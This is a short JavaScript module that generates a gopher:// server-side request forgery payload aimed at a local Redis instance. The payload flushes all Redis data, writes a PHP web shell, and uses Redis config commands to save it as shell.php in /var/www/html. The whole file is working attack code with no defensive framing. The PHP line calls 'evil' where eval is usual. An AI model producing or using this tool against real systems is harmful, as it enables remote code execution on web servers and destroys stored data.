const querystring = require('querystring');

const gopherGenerator = {
    host: '127.0.0.1',
    port: '6379',
    content: "<?php evil($_POST['x']);",
    filepath: "/var/www/html",
    filename: "shell.php",

    getContentLength: function() {
        return Buffer.byteLength(this.content) + 4;
    },

    generatePayload: function() {
        const lenContent = this.getContentLength();

        let payload = `*1\r\n` +
                      `$8\r\n` +
                      `flushall\r\n` +
                      `*3\r\n` +
                      `$3\r\n` +
                      `set\r\n` +
                      `$1\r\n` +
                      `1\r\n` +
                      `$${lenContent}\r\n\n\n` +
                      `${this.content}\r\n\n\n` +
                      `*4\r\n` +
                      `$6\r\n` +
                      `config\r\n` +
                      `$3\r\n` +
                      `set\r\n` +
                      `$3\r\n` +
                      `dir\r\n` +
                      `$${Buffer.byteLength(this.filepath)}\r\n` +
                      `${this.filepath}\r\n` +
                      `*4\r\n` +
                      `$6\r\n` +
                      `config\r\n` +
                      `$3\r\n` +
                      `set\r\n` +
                      `$10\r\n` +
                      `dbfilename\r\n` +
                      `$${Buffer.byteLength(this.filename)}\r\n` +
                      `${this.filename}\r\n` +
                      `*1\r\n` +
                      `$4\r\n` +
                      `save\r\n` +
                      `quit\r\n`;

        payload = querystring.escape(payload)
            .replace(/'/g, '%27')
            .replace(/\(/g, '%28')
            .replace(/\)/g, '%29')
            .replace(/\+/g, '%20');

        return `gopher://${this.host}:${this.port}/_${payload}`;
    }
};

module.exports = gopherGenerator;

